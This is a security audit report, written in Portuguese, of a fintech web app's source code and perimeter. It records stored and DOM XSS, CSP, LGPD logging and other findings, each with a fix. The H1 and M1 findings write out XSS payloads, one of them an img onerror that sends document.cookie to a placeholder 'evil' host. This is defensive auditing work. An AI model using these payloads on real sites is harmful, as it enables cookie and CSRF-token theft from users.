# Auditoria de Segurança — PigBank

**Data:** 2026-08-02 · **Escopo:** código-fonte completo (`Bot Financeiro/`) + perímetro passivo de `pigbankai.com`
**Método:** análise estática + checagem passiva de headers/paths (sem carga, sem exploit em produção)

---

## Veredito

A base está **bem endurecida** — auth, IDOR, SQL injection, integridade de pagamentos e verificação de webhooks estão sólidos. Há **1 falha HIGH** (XSS armazenado) que merece correção imediata, mais um punhado de itens Médios/Baixos de hardening e LGPD. Nada que exija derrubar nada; todos os fixes são localizados.

**Placar:** 1 High · 4 Médios · 6 Baixos · 3 Info

---

## 🔴 HIGH

### H1 — XSS armazenado no dashboard (descrição e categoria de lançamento → `innerHTML`)
- **Arquivos:** `frontend/dashboard.js:6653`, `:6654`, `:5729` (`describeLaunch` retorna `l.nota || l.alvo` cru), `:6416` (banner de alerta de orçamento)
- **Problema:** `l.nota` (descrição do lançamento, 100% input do usuário — bot/WhatsApp/dashboard/memo do OFX) e `l.categoria` (categoria custom) são interpolados direto em `innerHTML` **sem escape**. Caminhos irmãos no mesmo arquivo usam `escapeHtmlSafe()` (ex.: `:5342`, `:6411`) — é um esquecimento, não design.
- **Exploit:** criar lançamento com descrição `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`. Executa toda vez que a lista renderiza. Como o cookie `csrf_token` é `httponly=False` (necessário pro double-submit), o payload lê o token CSRF e dispara requisições autenticadas same-origin (apagar dados, mudar settings). **Vetor cross-user:** vítima que importa um OFX "extrato" do atacante (`ofx_import.py:207` copia `memo` → `nota`) recebe o payload e ele dispara no dashboard dela — não é só self-XSS.
- **Fix:** envolver os três sinks em `escapeHtmlSafe()`: `:6653` escapar o retorno de `describeLaunch` (ou fazer a função retornar já escapado), `:6654` `escapeHtmlSafe(l.categoria)`, `:6416` `escapeHtmlSafe(a.categoria)`. Combinar com o fix de CSP (M3) como defesa em profundidade.

---

## 🟠 MÉDIO

### M1 — DOM XSS via quebra de atributo `onclick` (nome de grupo de parcelas/investimento)
- **Arquivos:** `frontend/dashboard.js:1206`, `:1207`
- **Problema:** `onclick='... openInstEditModal(${JSON.stringify(g.name)} ...)'` — o atributo usa aspas simples, mas `JSON.stringify()` só escapa aspas duplas. Uma aspa simples em `g.name` (nome do grupo, definido pelo usuário) fecha o atributo e injeta novos (`' onmouseover='alert(1)`).
- **Exploit:** nomear grupo de parcelas `x' onmouseover='fetch(...)`; passar o mouse no botão de editar executa.
- **Fix:** escapar HTML após o JSON (`escapeHtmlSafe(JSON.stringify(g.name))`) ou mover os valores pra atributos `data-` e ler no handler.

### M2 — `/ai/chat` sem limite de burst nem `max_tokens` (DoS de custo de LLM)
- **Arquivos:** `frontend/finance_bot_websocket_custom.py:3438`, `core/services/ai_chat/runner.py:213-218`, `:45` (`MAX_TOOL_LOOPS=6`)
- **Nota importante:** o **isolamento multi-tenant da IA é sólido** — `user_id` vem do JWT e é injetado server-side em todo `tool.execute`; nenhum schema de tool aceita `user_id`/`account_id`; a única SQL inline é parametrizada e filtrada por `where user_id=%s`; writes destrutivos exigem "sim" humano. Prompt injection é mitigado estruturalmente. **O buraco é custo, não dado.**
- **Problema:** o endpoint não tem limite por-minuto/burst nem `max_tokens` na completion. Um usuário Pro pode queimar a cota mensal inteira de uma vez, com tokens de saída ilimitados → conta de LLM só limitada mensalmente.
- **Fix:** adicionar `@limiter.limit()` de burst no `/ai/chat` (o mecanismo de decorator funciona — ver nota de rate-limit abaixo), setar `max_tokens` na completion, e considerar teto mensal por tokens em vez de por nº de mensagens.

### M3 — CSP com `'unsafe-inline'` no `script-src`
- **Arquivo:** `frontend/finance_bot_websocket_custom.py:1445` (confirmado ao vivo nos headers)
- **Problema:** `script-src 'self' 'unsafe-inline' ...` — `'unsafe-inline'` anula boa parte do valor anti-XSS do CSP; qualquer `<script>` inline injetado executa. Amplifica o H1.
- **Fix:** mover scripts inline pra arquivos externos e remover `'unsafe-inline'` do `script-src`, ou adotar nonce por-resposta. `style-src 'unsafe-inline'` é risco menor, mas idealmente também sai.

### M4 — Email de usuário logado em texto puro no nível INFO (LGPD)
- **Arquivo:** `core/services/engagement_scheduler.py:125, 144, 165, 245`
- **Problema:** `logger.info("[engagement] ... user_id=%s (%s)", user_id, email)`. O produto criptografa email em repouso (`email_enc`, acesso auditado), mas esses logs escrevem o email em claro no stdout (Railway, retido/agregado) — anula o controle de cifragem e é violação de minimização da LGPD.
- **Fix:** logar só `user_id`, ou email redigido (`f"{email[:2]}***@{domain}"`). Remover o arg `(%s)`.

---

## 🟡 BAIXO

### B1 — Erros verbosos ecoados ao cliente
- **Arquivos:** ~30 handlers com `HTTPException(detail=str(exc))`; notáveis: `finance_bot_websocket_custom.py:3098` e `:3101` (string crua da exceção do Stripe), `:3860/:3900/:3947/:4054` (500 de DB/registro).
- **Problema:** vazam detalhe interno, mensagem do provedor ou texto de constraint do DB ao chamador da API.
- **Fix:** mensagem genérica pra 5xx e falhas de Stripe; logar o detalhe server-side. Validações 400 com `ValueError` controlado são aceitáveis.

### B2 — Código de vínculo de conta com 6 dígitos, sem lockout no pipeline do bot
- **Arquivos:** `db/users.py:238` (`f"{secrets.randbelow(1_000_000):06d}"`), consumido em `core/handlers/account.py:20/32`
- **Problema:** adivinhar um código ativo vincula o WhatsApp do atacante à conta da vítima (controle total via bot). Espaço 10⁶, single-use, ~10-15 min, transporte rate-limited pela Meta → impraticável na prática, mas é primitivo de vínculo protegido por segredo fraco sem lockout de app.
- **Fix:** código alfanumérico (`secrets.token_urlsafe(9)`) + lockout por-remetente (ex.: 5 tentativas erradas → cooldown) nos handlers `vincular`/`link`.

### B3 — Webhook do WhatsApp faz **fail-open** se `WA_APP_SECRET` faltar (não-prod)
- **Arquivos:** `adapters/whatsapp/wa_runtime.py:90-91` (`return True` com secret vazio) + `wa_app.py:247` (short-circuit `if APP_SECRET and not verify...`)
- **Problema:** prod é protegido (guard no import). Staging/dev sem secret aceita **qualquer** POST não-assinado em `/wa/webhook`, injetando "mensagens" que dirigem ações reais do bot contra dados de staging.
- **Fix:** `verify_webhook_signature` retornar `False` (fail-closed) quando `app_secret` vazio, e remover o short-circuit `APP_SECRET and`. Comportamento de prod não muda.

### B4 — Fallback HMAC `"pigbank-unsub"` para token de descadastro
- **Arquivos:** `core/services/email_service.py:204`, `finance_bot_websocket_custom.py:3654`
- **Problema:** `secret = (os.getenv("JWT_SECRET") or "pigbank-unsub").encode()`. Se `JWT_SECRET` faltasse, tokens de unsubscribe seriam assinados com constante pública (forjável — qualquer um descadastra qualquer usuário). Mitigado porque o dashboard não sobe sem `JWT_SECRET`, mas `email_service` é importável por outros entrypoints (bot, schedulers) sem esse guard.
- **Fix:** usar o mesmo helper fail-closed `_require_jwt_secret()` em vez do fallback string.

### B5 — Sweep de exclusão de conta depende só de cascade para ~15 tabelas
- **Arquivo:** `db/privacy.py:412-571`
- **Problema:** `user_owned_tables` e a verificação de sobra pós-delete (`:555`) não incluem `ai_messages`, `recurring_*`, `bill_instances`, `user_mfa*`, `data_export_tokens`, `auth_refresh_tokens`, `affiliate_*`, `pocket_lots` etc. São purgadas só por `ON DELETE CASCADE`. O próprio comentário avisa que DBs antigos podem não ter todas as FKs — e se faltar uma, o resíduo seria **silencioso** (a verificação nem olha essas tabelas).
- **Fix:** adicionar as tabelas cascade-only ao sweep explícito e à verificação de sobra, ou assertion de startup checando as constraints FK.

### B6 — CSV formula injection no export
- **Arquivo:** `frontend/finance_bot_websocket_custom.py:863-879` (`build_csv`)
- **Problema:** `categoria`/`descricao` escritos crus; célula tipo `=HYPERLINK(...)` executa ao abrir no Excel/Sheets. Sem vetor cross-user hoje (export vai pro próprio dono), mas memos de banco são texto de influência externa.
- **Fix:** prefixar com `'` células que começam com `= + - @ \t \r`. Aplicar no builder XLSX também se compartilha os dados.

---

## ⚪ INFORMATIVO

- **I1 — Rota `/debug/ai/{user_id}/payload` viva em prod** (`finance_bot_websocket_custom.py:4162`): retorna o payload interno enviado ao LLM. É IDOR-safe (só dados próprios), mas é rota de debug na superfície de prod. Recomendo gate por env-flag ou remover.
- **I2 — Colunas PII em claro ainda vivas** (`db/privacy.py:292`, `settings.py:181/187`): `email`/`phone_e164` em cleartext ao lado de `email_enc` (Fase 5 pendente). Todo backup/export carrega PII em claro. Drop é irreversível — precisa do seu aval.
- **I3 — Tokens legados sem `jti` não revogáveis até expirar** (`shared.py:225`): tradeoff de rollout aceito; se auto-resolve conforme tokens antigos expiram.

---

## ✅ Verificado como SÓLIDO (não regredir)

- **SQL injection:** ausente — `db/*.py` toda parametrizada (`%s`), inclusive busca free-text (`analytics.py:773`) e `UPDATE ... SET` dinâmicos.
- **IDOR / access control:** todo route por-usuário passa por `authorize_dashboard_access` (`token_user == path_user`); toda query filtra por `user_id`.
- **JWT:** HS256 com `JWT_SECRET` obrigatório, `algorithms=["HS256"]` fixo (sem alg-confusion/`none`), claim `type` segrega auth/dashboard/admin, expiry sempre, sessões revogáveis por `jti`.
- **Admin:** bcrypt, senha em claro recusada no boot em prod, hash malformado nega (não cai pra plaintext), cookie `httponly+secure+SameSite=Strict+path=/admin`.
- **Webhooks:** Stripe (`construct_event`), WhatsApp (HMAC-SHA256) e Pluggy (HMAC) verificam assinatura antes de agir; secrets obrigatórios no boot em prod.
- **Pagamentos/afiliados:** preço do checkout server-side (nunca do cliente); comissão idempotente calculada do invoice verificado; anti-self-referral; saque com `SELECT ... FOR UPDATE` (sem double-spend); sem mass-assignment de `is_pro`/`balance`/`role`.
- **Cookies:** `auth/dashboard/refresh_token` = `httponly+secure+SameSite=Lax`; `csrf_token` = `SameSite=Strict`.
- **CSRF:** double-submit `csrf_token` cookie + `x-csrf-token` header, comparação constant-time; exceções só webhooks assinados.
- **Rate limit (auth):** decorators `@limiter.limit()` estão **ativos** (só o `default_limits` global é inerte) — login 5/min, register/forgot/reset 3/h–5/min, + limiter persistente em DB por email/IP (sobrevive a restart/multi-worker).
- **Upload OFX:** allowlist de content-type, cap 8 MB, `reject_dangerous_xml()` bloqueia XXE + billion-laughs antes do parse; filename nunca vira path (sem traversal).
- **SSRF:** todo fetch de saída aponta pra host fixo/env (Pluggy, Meta, BCB, Google) — nunca URL do usuário.
- **Open redirect:** `/d/{code}?next=` com allowlist (`startswith("/")` + prefixo permitido).
- **Deserialização / command injection:** ausentes (sem `pickle`, `yaml.load` inseguro, `shell=True`, `eval`/`exec` em dado externo).
- **Perímetro (headers ao vivo):** HSTS + `includeSubDomains`, `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `nosniff`, Referrer/Permissions-Policy ok; `/.env`, `/.git/config`, `/openapi.json`, `/docs` → 404; FastAPI docs desabilitados em prod; CORS travado no domínio.
- **Segredos:** nenhuma credencial real commitada; `.env` gitignored; histórico limpo; deps pinadas e atuais.

---

## Ordem sugerida de correção

1. **H1** (XSS armazenado) — `escapeHtmlSafe()` nos 3 sinks. Rápido e localizado.
2. **M1** (onclick breakout) — mesmo padrão de escape.
3. **M3** (CSP `unsafe-inline`) — fecha a superfície que amplifica XSS.
4. **M2** (rate-limit + `max_tokens` na IA) — protege a conta de LLM.
5. **M4 / B1** (email em log / erros verbosos) — LGPD e vazamento de detalhe.
6. Baixos e Informativos conforme aparecerem.
